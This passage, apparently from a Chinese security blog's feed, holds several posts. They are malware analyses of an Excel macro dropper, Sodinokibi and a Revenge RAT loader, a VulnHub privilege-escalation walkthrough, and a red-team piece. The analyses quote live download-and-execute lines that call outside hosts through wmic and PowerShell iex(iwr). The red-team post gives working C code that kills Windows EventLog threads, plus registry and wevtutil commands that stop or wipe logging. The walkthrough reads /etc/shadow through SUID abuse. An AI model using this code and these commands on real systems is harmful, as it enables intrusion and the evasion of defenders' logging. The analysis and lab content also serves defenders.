eruireur&#39;!AN26&amp;&#39;reierj ntrutruiret eruireur&#39;!AN27&amp;&#39;reierj ntrutruiret eruireur&#39;!AN28&amp;&#39;reierj ntrutruiret eruireur&#39;!AN29&amp;&#39;reierj ntrutruiret eruireur&#39;!AN30&amp;&#39;reierj ntrutruiret eruireur&#39;!AN31&amp;&#39;reierj ntrutruiret eruireur&#39;!AN32&amp;&#39;reierj ntrutruiret eruireur&#39;!AN33&amp;&#39;reierj ntrutruiret eruireur&#39;!AD17,AH24,0,A96,&#39;reierj ntrutruiret eruireur&#39;!AD16&amp;&#39;reierj ntrutruiret eruireur&#39;!AE16,0,0) //URLMon URLDownloadToFileA JJCCBB,0,https://opposedent.com/css/main.css  C:/Users/Public//send.css=AE25()  ;EXEC(&quot;wmic process call create &#39;C:/Users/Public/send.css&#39;&quot;)//远程下载https://opposedent.com/css/main.css 保存在C:/Users/Public/send.css，wmic创建进程执行C:/Users/Public/send.css</code></pre><p><strong> main.css </strong><br>MD5    6f891127db5efdb86a63c7a60a96103f<br>SHA-1    590945c764eb6acccadba94c02d0bc710886f865<br>SHA-256    944e1871cecddd5c18a8939f246e5f552cb24f0b0179f4902c0559b2ad3d336b<br>Vhash    075066551d1d15155az5e!z<br>Authentihash    da7ab1728350ba9cf4a5f8dfa807d89002ad70db8c76829562500c0044776b37<br>Imphash    60f1da2d26406f6f3578f73785af8e9a<br>Rich PE header hash    004ccbc588d0cc025f006eb509f7f855<br>SSDEEP    12288:cGMMRFE7g6Ys/K7zyfuJTsQp4Cp6y5SrL1znr2LphlYuGUoPavYWIJdvrQoDpNkr:9zwRYs/K7ziuKU4jALFYuGDQ2vQoDkRN<br>TLSH    T10AF48D307A52C038F5FB21F85AA9DE34941DBAB0671C68CB63D55EE9D6385F89C3021B<br>PE查询结果<br><img src="https://z3.ax1x.com/2021/06/09/2soBnS.png" alt=""></p><p>VC写的，x86，开了ASLR<br><img src="https://z3.ax1x.com/2021/06/09/2soD0g.png" alt=""></p><p>整体流程是：</p><pre><code>1. 延时几秒2. 反调试检测3. 获取当前进程路径4. 读取自身，设置文件指针，文件数据读取5. 内存区域更改6. 加载执行</code></pre><p><img src="https://z3.ax1x.com/2021/06/09/2sor7Q.png" alt=""></p><p>反调试检测<br><img src="https://z3.ax1x.com/2021/06/09/2soykj.png" alt=""></p><p>加载对应的DLL和实例化对应的API<br><img src="https://z3.ax1x.com/2021/06/09/2so6ts.png" alt=""></p><p>读取自身<br><img src="https://z3.ax1x.com/2021/06/09/2sochn.png" alt=""></p><p>加载对应的DLL和API<br><img src="https://z3.ax1x.com/2021/06/09/2so2pq.png" alt=""></p><p>内存加载的PE<br><img src="https://z3.ax1x.com/2021/06/09/2soR10.png" alt=""></p><p>调试过一遍后，没看出什么危险的操作。利用沙箱运行得到以下结果<br><a href="https://s.threatbook.cn/report/file/944e1871cecddd5c18a8939f246e5f552cb24f0b0179f4902c0559b2ad3d336b/?env=win7_sp1_enx86_office2013" target="_blank" rel="noopener">https://s.threatbook.cn/report/file/944e1871cecddd5c18a8939f246e5f552cb24f0b0179f4902c0559b2ad3d336b/?env=win7_sp1_enx86_office2013</a><br><img src="https://z3.ax1x.com/2021/06/09/2soWcV.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/09/2sofXT.png" alt=""></p><h2 id="技术总结"><a href="#技术总结" class="headerlink" title="技术总结"></a>技术总结</h2><pre><code>1. Excel隐藏表执行宏2. 反调试，反沙箱3. 读取自身内存加载PE执行</code></pre><p>能力有限，勿喷</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;信息来源：&lt;a href=&quot;https://nitter.domain.glass/Arkbird_SOLG/status/14008454</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>HackSudo Aliens靶场</title>
    <link href="http://422926799.github.io/posts/be372d38.html"/>
    <id>http://422926799.github.io/posts/be372d38.html</id>
    <published>2021-06-06T16:48:20.000Z</published>
    <updated>2021-06-06T17:08:13.809Z</updated>
    
    <content type="html"><![CDATA[<p>vulnhub的一个靶场<br>链接：<a href="http://www.vulnhub.com/entry/hacksudo-aliens,676/" target="_blank" rel="noopener">http://www.vulnhub.com/entry/hacksudo-aliens,676/</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>开局nmap<br><img src="https://z3.ax1x.com/2021/06/07/2dmTbj.png" alt=""></p><p>两个web，一个开了phpmyadmin<br>常规路径扫描<br><img src="https://z3.ax1x.com/2021/06/07/2dmban.png" alt=""></p><p>访问得到mysql.bak，拿到mysql连接凭证。phpmyadmin登录<br><img src="https://z3.ax1x.com/2021/06/07/2dmvxU.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/07/2dnPaR.png" alt=""></p><h2 id="入口点"><a href="#入口点" class="headerlink" title="入口点"></a>入口点</h2><p>查看secure_file_priv，可以写shell<br><img src="https://z3.ax1x.com/2021/06/07/2dnERK.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/07/2dneMD.png" alt=""></p><p>用php_reverse_shell.php反弹个shell<br><img src="https://z3.ax1x.com/2021/06/07/2dnMdA.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/07/2dnKZd.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>常规提权检测<br>1./etc/passwd是否可写<br>2.内核版本查询<br>3.suid和sudo查询<br>……<br>发现date有SUID权限，利用其读取/root/root.txt<br>拿到root.txt:)<br><img src="https://z3.ax1x.com/2021/06/07/2dnQII.png" alt=""></p><p>读取/root/.bash_history看到操作日志切换到hacksudo用户后给Downloads下的cpulimit设置了SUID<br><img src="https://z3.ax1x.com/2021/06/07/2dndds.png" alt=""></p><p>用date读取/etc/shadow<br><img src="https://z3.ax1x.com/2021/06/07/2dnwon.png" alt=""></p><p>拿到hacksudo hash，john爆破得到明文<br><img src="https://z3.ax1x.com/2021/06/07/2dnBiq.png" alt=""></p><p>登录后拿到users.txt<br>利用cpulimit执行/bin/bash，获得root<br><img src="https://z3.ax1x.com/2021/06/07/2dnDJ0.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/07/2dnrWV.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/07/2dnszT.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;vulnhub的一个靶场&lt;br&gt;链接：&lt;a href=&quot;http://www.vulnhub.com/entry/hacksudo-aliens,676/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.vulnhub.com/entr</summary>
      
    
    
    
    
    <category term="靶场练习" scheme="http://422926799.github.io/tags/靶场练习/"/>
    
  </entry>
  
  <entry>
    <title>Sodinokibi勒索分析</title>
    <link href="http://422926799.github.io/posts/d188378a.html"/>
    <id>http://422926799.github.io/posts/d188378a.html</id>
    <published>2021-06-01T11:01:56.000Z</published>
    <updated>2021-06-01T11:14:28.874Z</updated>
    
    <content type="html"><![CDATA[<p><strong>ps:该文章并无完全分析出整个过程</strong><br>原样本分析链接：<a href="http://blog.nsfocus.net/revil-apt/" target="_blank" rel="noopener">http://blog.nsfocus.net/revil-apt/</a><br>样本下载地址：<a href="https://app.any.run/tasks/c6ea97fa-4ec4-4820-8280-5d1c8704b460/" target="_blank" rel="noopener">https://app.any.run/tasks/c6ea97fa-4ec4-4820-8280-5d1c8704b460/</a><br>该样本分析与参考链接分析过程不一样，那个链接应该是完全解密的。该勒索病毒<br>经过三断加密最后释放shellcode进行DLL加载调用</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>VT查杀结果<br><img src="https://z3.ax1x.com/2021/06/01/2ubDU0.png" alt=""></p><p>沙盒运行分析：<a href="https://app.any.run/tasks/9e9c51ad-cc20-4807-bace-41a9428b3681" target="_blank" rel="noopener">https://app.any.run/tasks/9e9c51ad-cc20-4807-bace-41a9428b3681</a></p><p>入口点分析:<br><img src="https://z3.ax1x.com/2021/06/01/2ub68U.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/01/2ubgv4.png" alt=""></p><p>释放MsMpEng.exe和Mpsvc.dll到TEMP目录</p><p>执行流程是：MsMpEng.exe加载Mpsvc.dll （白加黑）<br>调用的Mpsvc.dll的ServiceCrtMain函数<br><img src="https://z3.ax1x.com/2021/06/01/2ubRKJ.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/01/2ubfbR.png" alt=""></p><p>ServiceCrtMain函数<br><img src="https://z3.ax1x.com/2021/06/01/2ub5Ux.png" alt=""></p><p>sub_100011C0函数实现加载PE<br><img src="https://z3.ax1x.com/2021/06/01/2ubTPK.png" alt=""></p><p>跟踪VirtualProtect地址修改权限的地址，这里dump后是一段解密DLL加载的shellcode<br><img src="https://z3.ax1x.com/2021/06/01/2ub78O.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/01/2ubLKH.png" alt=""></p><p>Process Hacker dump运行一分钟后线程为RWX权限的内存保存，得到解密后的dll<br><img src="https://z3.ax1x.com/2021/06/01/2ubvVI.png" alt=""></p><p>修补PE头<br><img src="https://z3.ax1x.com/2021/06/01/2uqFMQ.png" alt=""></p><p>重构PE大小<br><img src="https://z3.ax1x.com/2021/06/01/2uqAqs.png" alt=""></p><p>最后调用dll实现勒索<br>第一段dump和运行时解密的dll加密度对比，左边是第一次dump的，右边是解密后的dll 还有加密（<br><img src="https://z3.ax1x.com/2021/06/01/2uqVZn.png" alt=""></p><h2 id="IOCS"><a href="#IOCS" class="headerlink" title="IOCS"></a>IOCS</h2><p>IOCS:<br>835f242dde220cc76ee5544119562268<br>7d1807850275485397ce2bb218eff159<br>8cc83221870dd07144e63df594c391d9</p><h2 id="知识总结"><a href="#知识总结" class="headerlink" title="知识总结"></a>知识总结</h2><ul><li>遇见内存加载dll或反射dll加载，或者更改区断权限为RWX，对VirtualProtect函数地址下断点，断下后copy VirtualProtect函数里的地址跳转过去。dump即可</li><li>反射加载:运行进程后，Process Hacker找到该进程内存线程权限为RWX，dump即可得到完全解密的内容</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.163.com/dy/article/FOB083490531I6Y1.html" target="_blank" rel="noopener">https://www.163.com/dy/article/FOB083490531I6Y1.html</a><br><a href="https://blog.csdn.net/slc1112/article/details/111089013" target="_blank" rel="noopener">https://blog.csdn.net/slc1112/article/details/111089013</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;ps:该文章并无完全分析出整个过程&lt;/strong&gt;&lt;br&gt;原样本分析链接：&lt;a href=&quot;http://blog.nsfocus.net/revil-apt/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://blog.nsf</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>停止windows日志记录研究</title>
    <link href="http://422926799.github.io/posts/c6ff3736.html"/>
    <id>http://422926799.github.io/posts/c6ff3736.html</id>
    <published>2021-05-18T04:09:39.000Z</published>
    <updated>2021-05-18T04:20:46.539Z</updated>
    
    <content type="html"><![CDATA[<h2 id="方法一-注册表修改永久停止日志记录"><a href="#方法一-注册表修改永久停止日志记录" class="headerlink" title="方法一:注册表修改永久停止日志记录"></a>方法一:注册表修改永久停止日志记录</h2><p>需要注销/重启</p><pre><code>reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MiniNt&quot;</code></pre><h2 id="方法二-停止记录日志记录的线程"><a href="#方法二-停止记录日志记录的线程" class="headerlink" title="方法二:停止记录日志记录的线程"></a>方法二:停止记录日志记录的线程</h2><p>思路:<br>tips:需要拥有SeDebugPrivilege权限，不然不能正确执行–&gt;使用powershell管理权限运行即可<br>1.遍历所有进程获取所有进程PID<br>2.获取所有进程名为svchost.exe的进程PID<br>3获取这些进程命令行存在LocalServiceNetworkRestricted字符串的PID<br>4.获取这个PID的所有线程(TID)，获取所有TID的服务名称。是eventlog/EventLog字符串服务名称杀掉线程</p><p>用到的API：<br>枚举所有进程:<br>CreateToolhelp32Snapshot<br>Process32First<br>Process32Next</p><p>x64获取指定进程块(PEB)/TEB信息:<br>ntdll.dll - NtQueryInformationProcess #获取进程块信息<br>ntdll.dll - NtQueryInformationThread #获取线程块信息</p><p>读取内存:<br>ReadProcessMemory</p><p>枚举所有线程:<br>CreateToolhelp32Snapshot<br>Thread32First<br>Thread32Next</p><blockquote><p>获取到进程号之后我们需要识别具体的服务线程，在windows vista之后的系统，具体的服务线程约定使用servicemain作为入口点，同时服务线程自身会带有一个等同于服务名的tag，这个tag可以帮我们识别这个线程是否是我们寻找的，在x64线程teb中0x1720偏移的位置存放着service tag的数字标识<br>我们可以那这个数字标识使用I_QueryTagInformation api查询到具体service tag内容。<br><img src="https://z3.ax1x.com/2021/05/18/gfZg2t.png" alt=""></p></blockquote><p><img src="https://z3.ax1x.com/2021/05/18/gfZs5d.png" alt=""></p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#include &lt;TlHelp32.h&gt;#include &lt;winternl.h&gt;#pragma comment(lib, &quot;ntdll.lib&quot;)char *exename = &quot;svchost.exe&quot;;typedef struct _CLIENT_ID {    HANDLE UniqueProcess;    HANDLE UniqueThread;} CLIENT_ID;typedef NTSTATUS(WINAPI* pNtQueryInformationThread)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG, PULONG);typedef struct _THREAD_BASIC_INFORMATION{    NTSTATUS    exitStatus;    PVOID       pTebBaseAddress;    CLIENT_ID   clientId;    KAFFINITY               AffinityMask;    int                        Priority;    int                        BasePriority;    int                        v;} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;typedef enum _SC_SERVICE_TAG_QUERY_TYPE{    ServiceNameFromTagInformation = 1,    ServiceNameReferencingModuleInformation,    ServiceNameTagMappingInformation,} SC_SERVICE_TAG_QUERY_TYPE, *PSC_SERVICE_TAG_QUERY_TYPE;typedef struct _SC_SERVICE_TAG_QUERY{    ULONG   processId;    ULONG   serviceTag;    ULONG   reserved;    PVOID   pBuffer;} SC_SERVICE_TAG_QUERY, *PSC_SERVICE_TAG_QUERY;typedef NTSTATUS(WINAPI *NtQueryInformationProcessFake)(HANDLE, DWORD, PVOID, ULONG, PULONG);typedef ULONG(WINAPI* pI_QueryTagInformation)(PVOID, SC_SERVICE_TAG_QUERY_TYPE, PSC_SERVICE_TAG_QUERY);#define errorlog(data) {printf(&quot;API Error:%s Code:%d\n&quot;,data,GetLastError());}void EnumProcess();void test(int);void checkeventlog(CHAR *, int);void EnumProcess() {    HANDLE hprocesseap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    if (INVALID_HANDLE_VALUE == hprocesseap) {        errorlog(&quot;Funcion EnumProcess---&gt;CreateToolhelp32Snapshot&quot;);    }    PROCESSENTRY32W pe;    pe.dwSize = sizeof(PROCESSENTRY32W);    BOOL getlist = Process32First(hprocesseap, &amp;pe);    while (getlist)    {        CHAR processname[100];        sprintf(processname, &quot;%ws&quot;, pe.szExeFile);        if (strcmp(exename, processname) == 0) {            test(pe.th32ProcessID);        }        getlist = Process32Next(hprocesseap, &amp;pe);    }}void test(int pid) {    HANDLE target = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);    PEB peb = { 0 };    PROCESS_BASIC_INFORMATION pbi = { 0 };    NtQueryInformationProcessFake NtQueryInformationProcess;    RTL_USER_PROCESS_PARAMETERS Param = { 0 };    int commandlength = 0;    NtQueryInformationProcess = (NtQueryInformationProcessFake)GetProcAddress(LoadLibrary(L&quot;ntdll.dll&quot;), &quot;NtQueryInformationProcess&quot;);    NtQueryInformationProcess(target, 0, (PVOID)&amp;pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);    ReadProcessMemory(target, pbi.PebBaseAddress, &amp;peb, sizeof(PEB), NULL);    ReadProcessMemory(target, peb.ProcessParameters, &amp;Param, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL);    WCHAR *buffer = new WCHAR[Param.CommandLine.Length + 1];    ZeroMemory(buffer, (Param.CommandLine.Length + 1) * sizeof(WCHAR));    ReadProcessMemory(target, Param.CommandLine.Buffer, buffer, Param.CommandLine.Length, NULL); //获取进程命令行    if (wcsstr(buffer, L&quot;LocalServiceNetworkRestricted&quot;)!=NULL) {        printf(&quot;PID:%d\n&quot;, pid);        checkeventlog(exename, pid);    }}void checkeventlog(CHAR *name, int pid) {    printf(&quot;%s %d\n&quot;, name, pid);    pNtQueryInformationThread NtQueryInformationThread = NULL;    pI_QueryTagInformation I_QueryTagInformation = NULL;    THREADENTRY32 te;    THREAD_BASIC_INFORMATION tbi = { 0 };    SC_SERVICE_TAG_QUERY tagQuery = { 0 };    te.dwSize = sizeof(THREADENTRY32);    HANDLE hTag = NULL;    NtQueryInformationThread = (pNtQueryInformationThread)GetProcAddress(GetModuleHandle(L&quot;ntdll.dll&quot;), &quot;NtQueryInformationThread&quot;);    I_QueryTagInformation = (pI_QueryTagInformation)GetProcAddress(LoadLibrary(L&quot;advapi32.dll&quot;), &quot;I_QueryTagInformation&quot;);    HANDLE threads = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);    if (INVALID_HANDLE_VALUE == threads) {        errorlog(&quot;checkeventlog---&gt;CreateToolhelp32Snapshot&quot;);    }    BOOL getlist = Thread32First(threads, &amp;te);    while (getlist) {        if (te.th32OwnerProcessID == pid) {            HANDLE hthread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);            NtQueryInformationThread(hthread, (THREAD_INFORMATION_CLASS)0, &amp;tbi, 0x30, NULL);            HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, te.th32OwnerProcessID);            ReadProcessMemory(hprocess, ((PBYTE)tbi.pTebBaseAddress + 0x1720), &amp;hTag, sizeof(HANDLE), NULL);            tagQuery.processId = te.th32OwnerProcessID;            tagQuery.serviceTag = (ULONG)hTag;            I_QueryTagInformation(NULL, ServiceNameFromTagInformation, &amp;tagQuery); //获取线程的服务名称            CHAR servicename[MAX_PATH] = { 0 };            sprintf(servicename, &quot;%ws&quot;, tagQuery.pBuffer);            if (strcmp(servicename, &quot;EventLog&quot;)==0) {                printf(&quot;Kill %d %s\n&quot;, te.th32ThreadID, servicename);                TerminateThread(hthread, 0);            }            else if (strcmp(servicename, &quot;eventlog&quot;)==0) {                printf(&quot;Kill %d %s\n&quot;, te.th32ThreadID, servicename);                TerminateThread(hthread, 0);            }            tagQuery = { 0 }; //重置线程数组，不然只有一个线程的信息一直刷一样的 -作为一个例子记得写入笔记 (        }        getlist = Thread32Next(threads, &amp;te);    }}int main(){    EnumProcess();    system(&quot;pause&quot;);    return 0;}</code></pre><p>Windows7测试:<br><img src="https://z3.ax1x.com/2021/05/18/gfZYCR.png" alt=""></p><p>Windows10测试:<br><img src="https://z3.ax1x.com/2021/05/18/gfZWKf.png" alt=""></p><p>清除windows日志<br>(清除所有日志，但是将生成一个事件ID为1102的日志，用于清除日志)</p><pre><code>wevtutil cl Systemwevtutil cl Applicationwevtutil cl Securitywevtutil cl Setup</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://idiotc4t.com/defense-evasion/fuck-eventlog" target="_blank" rel="noopener">https://idiotc4t.com/defense-evasion/fuck-eventlog</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;方法一-注册表修改永久停止日志记录&quot;&gt;&lt;a href=&quot;#方法一-注册表修改永久停止日志记录&quot; class=&quot;headerlink&quot; title=&quot;方法一:注册表修改永久停止日志记录&quot;&gt;&lt;/a&gt;方法一:注册表修改永久停止日志记录&lt;/h2&gt;&lt;p&gt;需要注销/重启&lt;/p</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>Revenge RAT加载器分析(word远程模板加载)</title>
    <link href="http://422926799.github.io/posts/ac1cf40.html"/>
    <id>http://422926799.github.io/posts/ac1cf40.html</id>
    <published>2021-05-15T08:27:48.000Z</published>
    <updated>2021-05-15T08:42:36.121Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接：<a href="https://www.uptycs.com/blog/revenge-rat-targeting-users-in-south-america" target="_blank" rel="noopener">https://www.uptycs.com/blog/revenge-rat-targeting-users-in-south-america</a><br>VT查杀<br><img src="https://z3.ax1x.com/2021/05/15/g6Qjoj.png" alt=""></p><h2 id="初始文件"><a href="#初始文件" class="headerlink" title="初始文件"></a>初始文件</h2><p><img src="https://z3.ax1x.com/2021/05/15/g6Q7SP.png" alt=""></p><p>方式:office vba远程模板加载<br><img src="https://z3.ax1x.com/2021/05/15/g6QzYn.png" alt=""></p><p>随机加载<a href="http://azulviagens.online/1-9.docx将下载并执行其中一个模板。" target="_blank" rel="noopener">http://azulviagens.online/1-9.docx将下载并执行其中一个模板。</a><br>每个文件都具有相同的内容（相同的SHA-256：338b2d8d76f4028bfbd177127371b2509971606553d606c534316dc40cfa8fb9）<br><img src="https://z3.ax1x.com/2021/05/15/g6lClV.png" alt=""></p><h2 id="模板文件"><a href="#模板文件" class="headerlink" title="模板文件"></a>模板文件</h2><blockquote><p>模板文件（“ 1.docx” …“ 9x.docx”）遵循图4（如下所示）所示的结构。结构中的settings.xml具有指向XLSM文件的“目标”字段，该字段位于DOCX文件结构的“嵌入”目录中。XLSM文件“ Microsoft_Excel_Macro-Enabled_Worksheet.xlsm”到“ Microsoft_Excel_Macro-Enabled_Worksheet9.xlsm”具有相同的内容（相同的SHA-256：32f1a502126b1932e1def04b98d8be235c8d25ef7268f8cb35d460cd073a88b2）。当Microsoft Word执行模板文件（“ 1.docx” …“ 9x.docx”）时，它将执行XLSM文件之一（“ Microsoft_Excel_Macro-Enabled_Worksheet.xlsm”到“ Microsoft_Excel_Macro-Enabled_Worksheet9.xlsm”）<br><img src="https://z3.ax1x.com/2021/05/15/g6ltfI.png" alt=""></p></blockquote><p>docx模板中的XLSM文件<br><img src="https://z3.ax1x.com/2021/05/15/g6la1P.png" alt=""></p><p>word/embeddings目录下任意一个xlsm文件<br><img src="https://z3.ax1x.com/2021/05/15/g6lykj.png" alt=""></p><h2 id="xlsm文件"><a href="#xlsm文件" class="headerlink" title="xlsm文件"></a>xlsm文件</h2><p>该结构在“ VBAProject.bin”文件中包含宏。以下屏幕快照显示了包含宏的流。olevba提取宏</p><pre><code>Dim Program As String, TaskID As DoubleProgram = UserForm1.Image1.ControlTipText + UserForm1.Frame1.Tag + UserForm1.TabStrip1.ControlTipText + UserForm1.ScrollBar1.TagProgram01 = UserForm2.Image1.Tag + UserForm2.Frame1.ControlTipTextOn Error Resume Next        AppActivate &quot;UserForm1&quot;If Err &lt;&gt; 0 Then                Err = 0TaskID = Shell(Program, 0) //PowerShell  -ex Bypass -nOp -w 1 iex(iwr(&#39;http://azulviagens.online/A.txt&#39;))TaskID01 = Shell(Program01, 0) //taskkill  /f /im WINWORD.EXE            If Err &lt;&gt; 0 Then MsgBox &quot;Can&#39;t start &quot; &amp; ProgramEnd IfEnd Sub</code></pre><p><img src="https://z3.ax1x.com/2021/05/15/g6lXjK.png" alt=""></p><p>UserForm1.Image1.ControlTipText olevba没看到，由于是shell函数执行的程序。火绒剑监控得到运行的内容<br><img src="https://z3.ax1x.com/2021/05/15/g6lvnO.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/05/15/g6lzHe.png" alt=""><br>(调用powershell远程下载执行)</p><p><img src="https://z3.ax1x.com/2021/05/15/g61C4A.png" alt=""><br>(杀掉进程WINWORD.exe)</p><p><code>http://azulviagens.online/A.txt</code>在复现的时候已经失效了，根据原文章的图如下</p><pre><code class="vbs">$ProcName=&quot;index.vbs&quot;$WebFile=&quot;http://azulviagens.online/index.mp3&quot;C&#39;l&#39;e&#39;a&#39;r&#39;-&#39;H&#39;o&#39;s&#39;t&#39;(N&#39;e&#39;W-&#39;O&#39;b&#39;j&#39;e&#39;c&#39;t&#39; S&#39;y&#39;s&#39;t&#39;e&#39;m&#39;.&#39;N&#39;e&#39;t&#39;.&#39;W&#39;e&#39;b&#39;C&#39;l&#39;ient).DownloadFile($WebFile,&quot;$env:APPDATA\$ProcName&quot;) #保存在C:\Users\&lt;Username&gt;\AppData\Roaming\index.vbsS&#39;t&#39;a&#39;r&#39;t&#39;-&#39;P&#39;r&#39;o&#39;c&#39;e&#39;s&#39;s (&quot;$env:APPDATA\$ProcName&quot;) #运行C:\Users\&lt;Username&gt;\AppData\Roaming\index.vbs</code></pre><p>最后运行index.vbs然后index.vbs远程下载/1.txt保存在Opera.vbs然后运行Opera.vbs<br><img src="https://z3.ax1x.com/2021/05/15/g61a59.png" alt=""></p><p>最后是远程下载Opera.ps1并执行，ps1内容如下<br>重度混淆（<br><img src="https://z3.ax1x.com/2021/05/15/g61081.png" alt=""></p><p>经过手动解密混淆，过程如下</p><pre><code># Decode 1$a=iex  (  [CHar]36+[CHar]101  +[CHar]107+[CHar]108+[CHar]116+  [CHar]107+[CHar]116+  [CHar]101  +[CHar]107  +[CHar]100  +  [CHar]107+[CHar]113+  [CHar]106  +  [CHar]102+[CHar]100+[CHar]107  +[CHar]102  +  [CHar]100+[CHar]107+[CHar]102  +[CHar]107  +  [CHar]100  +[CHar]102+[CHar]107  +[CHar]115+  [CHar]100  +[CHar]107+  [CHar]115  +  [CHar]100  +[CHar]107+  [CHar]118  +  [CHar]99  +[CHar]107  +[CHar]107+  [CHar]101  +  [CHar]114  +[CHar]107+[CHar]101  +  [CHar]119  +  [CHar]116  +  [CHar]101  +  [CHar]107+  [CHar]114  +  [CHar]116+  [CHar]101+[CHar]107  +[CHar]121  +  [CHar]101  +  [CHar]107  +  [CHar]119  +[CHar]48  +[CHar]48  +  [CHar]48+  [CHar]48+  [CHar]61+[CHar]45+[CHar]74  +[CHar]111+  [CHar]105+  [CHar]110  +  [CHar]32+  [CHar]40  +[CHar]40+[CHar]49+  [CHar]49  +[CHar]49+[CHar]44  +  [CHar]32  +[CHar]49+[CHar]48+[CHar]53+  [CHar]44+[CHar]32+[CHar]49  +[CHar]51+  [CHar]48+  [CHar]41+  [CHar]124+  [CHar]32  +[CHar]70+[CHar]111+[CHar]114  +[CHar]69+  [CHar]97  +  [CHar]99  +  [CHar]104  +[CHar]45+[CHar]79+  [CHar]98+  [CHar]106+[CHar]101+[CHar]99  +  [CHar]116  +[CHar]32  +[CHar]123  +[CHar]40+[CHar]32+[CHar]91  +  [CHar]67  +[CHar]111+  [CHar]110+[CHar]118+  [CHar]101+[CHar]114+  [CHar]116  +[CHar]93+[CHar]58  +[CHar]58+  [CHar]84  +  [CHar]111+  [CHar]73  +  [CHar]110+  [CHar]116+[CHar]49+  [CHar]54  +[CHar]40  +[CHar]40+[CHar]91  +  [CHar]83+[CHar]116+  [CHar]114  +  [CHar]105+  [CHar]110  +  [CHar]103+[CHar]93+  [CHar]36+  [CHar]95+[CHar]32  +  [CHar]41+  [CHar]44  +  [CHar]32  +  [CHar]56+  [CHar]41+[CHar]32+[CHar]45+[CHar]65  +  [CHar]115+  [CHar]91+[CHar]67  +[CHar]104  +  [CHar]97  +[CHar]114+[CHar]93+[CHar]41+  [CHar]125  +[CHar]41  +[CHar]59  +[CHar]115+[CHar]97  +  [CHar]108+[CHar]32+  [CHar]103  +  [CHar]32+  [CHar]36  +[CHar]101  +  [CHar]107  +[CHar]108+  [CHar]116+  [CHar]107+[CHar]116+[CHar]101  +  [CHar]107  +[CHar]100  +[CHar]107  +  [CHar]113  +[CHar]106+  [CHar]102  +  [CHar]100+[CHar]107  +[CHar]102  +[CHar]100+[CHar]107+[CHar]102+[CHar]107  +[CHar]100  +  [CHar]102  +[CHar]107+  [CHar]115  +  [CHar]100+  [CHar]107  +[CHar]115+  [CHar]100+  [CHar]107  +  [CHar]118  +  [CHar]99  +[CHar]107  +  [CHar]107  +[CHar]101  +  [CHar]114  +  [CHar]107+  [CHar]101+  [CHar]119+  [CHar]116+[CHar]101+  [CHar]107  +  [CHar]114  +  [CHar]116+  [CHar]101  +[CHar]107  +[CHar]121  +[CHar]101  +  [CHar]107  +  [CHar]119+[CHar]48  +[CHar]48+  [CHar]48+[CHar]48  )# Decode 2$ekltktekdkqjfdkfdkfkdfksdksdkvckkerkewtekrtekyekw0000=-Join ((111, 105, 130)| ForEach-Object {( [Convert]::ToInt16(([String]$_ ), 8) -As[Char])});sal g $ekltktekdkqjfdkfdkfkdfksdksdkvckkerkewtekrtekyekw0000 #sal为set-alias变量缩写# Decode 3iex(  [CHar]70+  [CHar]117  +  [CHar]110  +  [CHar]99+  [CHar]116+  [CHar]105  +  [CHar]111+  [CHar]110  +  [CHar]32  +  [CHar]109+  [CHar]97+  [CHar]120+[CHar]100  +[CHar]111+[CHar]111  +[CHar]111  +[CHar]109  +[CHar]32+  [CHar]123+[CHar]13  +[CHar]10+[CHar]32+  [CHar]13+  [CHar]10  +[CHar]32  +[CHar]32+  [CHar]32+[CHar]32  +  [CHar]91  +  [CHar]67+  [CHar]109  +[CHar]100+[CHar]108+  [CHar]101  +  [CHar]116+[CHar]66+[CHar]105+  [CHar]110  +[CHar]100  +[CHar]105+  [CHar]110  +  [CHar]103  +  [CHar]40  +[CHar]41  +  [CHar]93+  [CHar]13  +  [CHar]10  +[CHar]32+  [CHar]32  +  [CHar]32  +  [CHar]32  +[CHar]91  +[CHar]79  